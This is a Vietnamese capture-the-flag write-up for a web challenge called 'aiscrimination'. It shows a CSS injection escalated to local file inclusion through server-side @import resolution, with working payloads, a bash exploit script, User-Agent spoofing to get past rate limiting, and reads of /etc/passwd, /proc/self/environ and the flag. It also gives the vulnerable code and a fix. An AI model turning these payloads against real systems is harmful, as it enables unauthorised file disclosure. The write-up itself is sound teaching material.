# Writeup — `aiscrimination`

> **Thể loại:** Web
> **Điểm:** 400 · **Format flag:** `CTF{sha256}`
> **Lỗ hổng cốt lõi:** CSS Injection → Server-Side `@import` resolution → **Local File Inclusion (LFI)** / Path Traversal
> **Flag:** `CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}`

---

## 0. TL;DR (đường đi ngắn nhất)

1. Đăng ký một "inclusion card" ở form `/join`. Field **`statement`** của card bị nhét **thô** vào một file CSS được sinh động server-side (`/assets/cards/<id>/identity.css`).
2. Server có bước "biên dịch theme" tự resolve `@import url("...")` bằng cách **đọc file trên đĩa và inline nội dung** vào CSS. Không có kiểm tra containment.
3. Thoát khỏi chuỗi `content:"..."` rồi chèn `@import url("/đường/dẫn/file")` → đọc được file bất kỳ.
4. Đọc `/proc/self/environ` + source `app.py` để định vị flag → đọc `/home/ctf/flag.txt`.

Payload đặt trong ô **Inclusion statement**:
```
"; } @import url("/home/ctf/flag.txt"); .z{content:"
```
Sau đó xem `http://<host>/assets/cards/<card_id_của_bạn>/identity.css`.

---

## 1. Hướng tư duy — đọc đề trước khi gõ lệnh

Trong CTF web, **tên bài và mô tả gần như luôn là hint kỹ thuật**, không phải văn vẻ.

- Tên bài: **`aiscrimination`**
- Mô tả: *"I want to be included"* — Format `CTF{sha256}`
- Câu hỏi: *"What is the flag hidden by the **inclusion design system**?"*

Từ khóa lặp đi lặp lại: **include / inclusion**. Trong web, "include" có nghĩa kỹ thuật rất cụ thể:
- `{% include %}` (Jinja / SSTI)
- `include()` / `require()` (PHP LFI)
- `@import` (CSS)
- `#include` (C), v.v.

→ **Giả thuyết ban đầu:** bài này xoay quanh một dạng *file/template inclusion*. Ghi nhớ để soi mọi input về sau.

**Nguyên tắc:** khi đề cứ nhấn mạnh một từ, coi nó là gợi ý kỹ thuật và bám theo.

---

## 2. Recon — vẽ bản đồ ứng dụng

Mục tiêu recon: liệt kê **INPUT** (nơi mình đưa dữ liệu vào) và **SINK/OUTPUT** (nơi dữ liệu hiện ra hoặc bị xử lý nguy hiểm). Mọi bug web = một đường nối bẩn từ input tới sink.

### 2.1 Trang chủ

```bash
curl -s http://34.107.74.208:32641/
```

Thu được:
- Một **feed** các bài "complaints" (nội dung tĩnh, chủ yếu là hint).
- Một **form `/join`** với 3 field: `display_name`, `comment`, `statement`.
- Mô tả form: *"Your contribution receives a small public identity card."*

### 2.2 Đọc kỹ các bài post — hint gần như spoiler

Bài **"The Brand Team Reused a Component"** (`/posts/reused-component`):

> *"inclusion cards no longer copy style fragments **by hand**. Bad news: someone described the **path rules** as 'intuitive.'"*

Comment dưới bài:
> *"If the **renderer** can find it, the renderer will **include** it. I hate that sentence."* — Tired SRE
> *"Paths and URLs are the two things I never understood..."* — Route 404

Dịch sang kỹ thuật:
- Có cơ chế **tự động ghép "style fragment"** (không phải copy tay).
- Có một **path** mà ai đó kiểm soát được.
- Có một **renderer đọc file theo path và include nội dung vào**.

→ Gộp lại: **"có chỗ include file theo path do người dùng tác động được"**. Đây gần như là mô tả trực tiếp của lỗ hổng.

### 2.3 Đọc trang `/policy` — hint phòng thủ

> *Visitors sending tiny, repetitive, or conspicuously mechanical requests may be asked to reflect...*
> *Long, browser-shaped requests are regarded as deeply human.*

Dịch: **có rate-limit lọc theo User-Agent**. Request ngắn/nhiều bị chặn; request "giống browser" (User-Agent dài) được tha.

→ Từ đây trở đi tôi **luôn gắn User-Agent giống Chrome** cho mọi request để né bộ lọc:

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36"
```

**Bài học:** đọc luôn phần server *cảnh báo* về phòng thủ — nó thường mô tả chính cơ chế bạn cần né.

---

## 3. Lần theo luồng dữ liệu (data flow)

### 3.1 Submit form `/join`

```bash
curl -s -i -A "$UA" -c cookies.txt \
  --data-urlencode "display_name=tester1" \
  --data-urlencode "comment=the printer wants my firmware" \
  --data-urlencode "statement=I belong here" \
  http://34.107.74.208:32641/join
```

Phản hồi: `302` redirect về `/`, kèm cookie:
```
Set-Cookie: session=eyJwcm9maWxlX2lkIjoi...
```
→ Session Flask chứa `profile_id`.

### 3.2 Card hiển thị ở đâu?

Load lại `/` **với cookie**, grep quanh id:

```bash
curl -s -A "$UA" -b cookies.txt http://34.107.74.208:32641/ | grep -iE "card|belong|include"
```

Hai dòng vàng:
```html
<a href="/people/f4b4ef4b349b474a97267809597bad71">Open this inclusion card →</a>
<link rel="stylesheet" href="/assets/cards/f4b4ef4b349b474a97267809597bad71/identity.css">
```

→ Card có:
- Trang riêng `/people/<id>`.
- **Một file CSS được sinh động cho từng card**: `/assets/cards/<id>/identity.css`.
- Trên card có `<span class="imported-fragment"></span>` (rỗng) — chữ *"imported"* khớp hint *"include"*.

**Đây là ứng viên SINK số 1.** File CSS này không tĩnh — nó được render từ dữ liệu của tôi.

### 3.3 Xem file CSS được sinh ra

```bash
curl -s -A "$UA" "http://34.107.74.208:32641/assets/cards/<id>/identity.css"
```

```css
/* AIscrimination identity-card stylesheet */
.identity-card::after {
  content: "I belong here";   /* <-- chính là statement tôi nhập */
  ...
}
```

→ **`statement` được nhét vào `content:"..."`.** Xác nhận đây là điểm dữ liệu-người-dùng đi vào output do server sinh.

---

## 4. Phân loại lỗ hổng — payload chẩn đoán

Vì có từ *"template/renderer"*, nghi đầu tiên là **SSTI (Jinja2)** — lỗi phổ biến nhất với Flask.

### 4.1 Test SSTI

Đăng ký card mới với `statement = {{7*7}}|${7*7}|<%= 7*7 %>|#{7*7}`:

```css
content: "{{7*7}}|${7*7}|<%= 7*7 %>|#{7*7}";
```

→ `{{7*7}}` hiện **nguyên văn**, không thành `49`. **Không phải SSTI.**

### 4.2 Test cách escape — payload quyết định

Đây là bước bước ngoặt. Thử `statement = a"b\c`:

```css
content: "a"b\c";
```

**Dấu `"` KHÔNG bị escape.** Đọc kết quả này:
- Không eval `{{...}}` → không phải template engine.
- Không escape `"` → đây **không phải** cách chèn biến an toàn; mà là **string được nhét thô vào một chuỗi CSS**.

→ **Đổi hướng:** đây là **CSS Injection**, không phải SSTI.

**Kỹ năng cốt lõi:** dùng 1-2 payload chẩn đoán để *phân loại* lỗ hổng, và **loại giả thuyết sai thật nhanh** thay vì cố đấm SSTI khi bằng chứng đã nói "không".

---

## 5. Nâng cấp CSS Injection → LFI

CSS Injection một mình thường **vô hại server-side** (chỉ ảnh hưởng giao diện phía client). Nhưng tôi có 2 mảnh ghép:

1. Tôi break được ra khỏi `content:"..."` để viết CSS tùy ý.
2. Hint cứ nói **import / include fragment / renderer đọc file**.

CSS có đúng một cú pháp "kéo thứ khác vào": **`@import`**.

→ **Giả thuyết mới:** server **tự resolve `@import` phía server** và inline nội dung file vào CSS (đúng nghĩa *"no longer copy style fragments by hand"*). Nếu đúng, `@import` một file bất kỳ = **LFI**.

### 5.1 Thiết kế payload

Muốn thoát khỏi block `content:"..."` rồi chèn `@import`. Payload đặt trong `statement`:

```
"; } @import url("/etc/passwd"); .x{content:"
```

Giải thích:
- `";` → đóng chuỗi và khai báo `content`.
- `}` → đóng block `.identity-card::after`.
- `@import url("/etc/passwd");` → câu import.
- `.x{content:"` → mở lại một block để phần CSS còn lại của template không vỡ cú pháp.

### 5.2 Kết quả — LFI xác nhận

```css
.identity-card::after { content: ""; }
#card-<id> .imported-fragment::after {
  content: "root:x:0:0:root:/root:/bin/bash\A daemon:x:1:1:...\A ... ctf:x:1000:1000::/home/ctf:/bin/sh\A ";
  ...
}
```

**Nội dung `/etc/passwd` đã bị đọc và inline vào CSS!** (`\A` là ký tự xuống dòng được escape cho CSS.)

Quan sát phụ (điều chỉnh payload cho khớp engine):
- Chỉ `@import url("...")` với **path tuyệt đối bắt đầu `/`** hoạt động.
- `@import "..."` (không có `url()`) và path **tương đối** → trả `/* design fragment unavailable */`.

---

## 6. Từ "đọc được file" → "đọc đúng file flag"

Có LFI rồi thì **không đoán mù** vị trí flag. Đọc metadata tiến trình trước.

### 6.1 `/proc/self/environ`

Payload: `@import url("/proc/self/environ")`. Trích ra:

```
HOME=/home/ctf
PWD=/home/ctf/app
DATABASE_PATH=/tmp/aiscrimination.db
THEME_ROOT=/home/ctf/app/themes/generated
```

→ Biết home = `/home/ctf`, app chạy ở `/home/ctf/app`, và **`THEME_ROOT`** (thư mục gốc mà `@import` resolve tương đối).

### 6.2 `/proc/self/cmdline`

```
/usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:5000 --workers 2 --threads 4 --timeout 60 app:app
```

→ App tên `app:app` (module `app.py`).

### 6.3 Đọc source `/home/ctf/app/app.py` để xác nhận cơ chế

Đây là đoạn "sink" quan trọng — **đọc source để xác nhận thay vì đoán**:

```python
THEME_ROOT = Path(os.environ.get("THEME_ROOT", str(BASE_DIR / "themes" / "generated")))

IMPORT_RE = re.compile(
    r"@import\s+(?:url\(\s*)?['\"]?([^'\"\s);]+)['\"]?\s*\)?\s*;",
    re.IGNORECASE,
)

def compile_theme(css_source: str, profile_id: str) -> str:
    def inline_import(match):
        requested = match.group(1)
        try:
            # `resolve()` normalizes ../ segments, but no containment check follows.
            imported = (THEME_ROOT / requested).resolve().read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            return "/* design fragment unavailable */"
        escaped = imported.replace("\\","\\\\").replace('"','\\"').replace("\n","\\A ")
        return f'#card-{profile_id} .imported-fragment::after {{ content: "{escaped}"; ... }}'
    return IMPORT_RE.sub(inline_import, css_source)

def profile_css(profile):
    source = f'''.identity-card::after {{ content: "{profile["statement"]}"; ... }}'''  # nhét thô
    return compile_theme(source, profile["id"])
```

Xác nhận đầy đủ mọi suy luận:
- `statement` được f-string thẳng vào CSS, **không encode** → CSS Injection.
- Regex `IMPORT_RE` bắt path, cấm các ký tự `'"` khoảng-trắng `);` trong path (nên payload không được chứa chúng — dùng path absolute không space là OK).
- `(THEME_ROOT / requested).resolve()` — `resolve()` chuẩn hóa `../` và **path absolute `/...` nhảy ra ngoài `THEME_ROOT`**, và **KHÔNG có kiểm tra containment** (comment trong code tự thú nhận). → Path Traversal / LFI đầy đủ.

### 6.4 Lấy flag

Dựa vào `HOME=/home/ctf`, thử vài vị trí flag hợp lý:

```
@import url("/home/ctf/flag.txt")     -> HIT
@import url("/home/ctf/app/flag.txt") -> miss
@import url("/flag.txt")              -> miss
```

Kết quả:
```css
content: "CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}\A ";
```

**🚩 Flag:** `CTF{5bb9cb8b8ff43e243fe85fceaf646e7ba6a5c80250e96678be2aa71add38eb97}`

---

## 7. Script khai thác (rút gọn)

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36"
HOST="http://34.107.74.208:32641"

lfi() {
  local target="$1"
  local st="\"; } @import url(\"$target\"); .z{content:\""
  local CJ=$(mktemp)
  # tạo card với statement chứa payload
  curl -s -A "$UA" -c "$CJ" \
    --data-urlencode "display_name=d" --data-urlencode "comment=c" \
    --data-urlencode "statement=$st" "$HOST/join" >/dev/null
  # lấy id card vừa tạo
  local PID=$(curl -s -A "$UA" -b "$CJ" "$HOST/" | grep -oE 'card-[0-9a-f]{32}' | head -1 | sed 's/card-//')
  # đọc CSS đã "biên dịch"
  curl -s -A "$UA" "$HOST/assets/cards/$PID/identity.css" | tr -d '\000' | sed -n '/imported-fragment/,/}/p'
}

lfi "/home/ctf/flag.txt"
```

---

## 8. Vì sao lỗ hổng tồn tại & cách vá

**Nguyên nhân:**
1. Dữ liệu người dùng (`statement`) được nội suy thẳng vào một chuỗi CSS không encode → thoát context được.
2. Server tự diễn giải `@import` như một chỉ thị đọc file, biến CSS injection thành file-read.
3. `Path.resolve()` chỉ chuẩn hóa đường dẫn, **không** kiểm tra kết quả có còn nằm trong `THEME_ROOT` hay không.

**Cách vá:**
- Encode/whitelist `statement` khi đưa vào CSS (chỉ cho phép ký tự an toàn, escape `"` và `\`).
- Không tự resolve `@import` do người dùng cung cấp; nếu cần, whitelist tên fragment (không nhận path).
- Kiểm tra containment sau `resolve()`:
  ```python
  p = (THEME_ROOT / requested).resolve()
  if not str(p).startswith(str(THEME_ROOT.resolve()) + os.sep):
      raise ValueError("path escapes theme root")
  ```

---

## 9. Bài học tư duy (áp dụng cho mọi web CTF)

1. **Đề/hint = từ khóa kỹ thuật.** "inclusion" → include/import.
2. **Recon để liệt kê source (input) và sink (nơi nguy hiểm).** Bug là đường nối giữa chúng.
3. **Một payload chẩn đoán để phân loại** lỗ hổng (`{{7*7}}` + test escape `"`).
4. **Loại giả thuyết sai nhanh** — đừng cố đấm SSTI khi bằng chứng nói không.
5. **Nâng cấp lỗ hổng "yếu"** bằng cú pháp đặc thù: CSS Injection tưởng vô hại → `@import` biến thành LFI.
6. **PoC nhỏ để xác nhận** (`/etc/passwd`) trước khi tìm mục tiêu thật.
7. **Không đoán đường dẫn flag** — dùng `/proc/self/environ`, `cmdline`, và source để định vị.
8. **Đọc cả cơ chế phòng thủ** (User-Agent/rate-limit) và né chủ động.

Điểm mấu chốt: khoảnh khắc `"` **không** bị escape đã lật hướng từ "SSTI" sang "CSS Injection", và việc nhớ hint "import/include" đã biến CSS injection tưởng-vô-hại thành LFI đọc được cả filesystem.
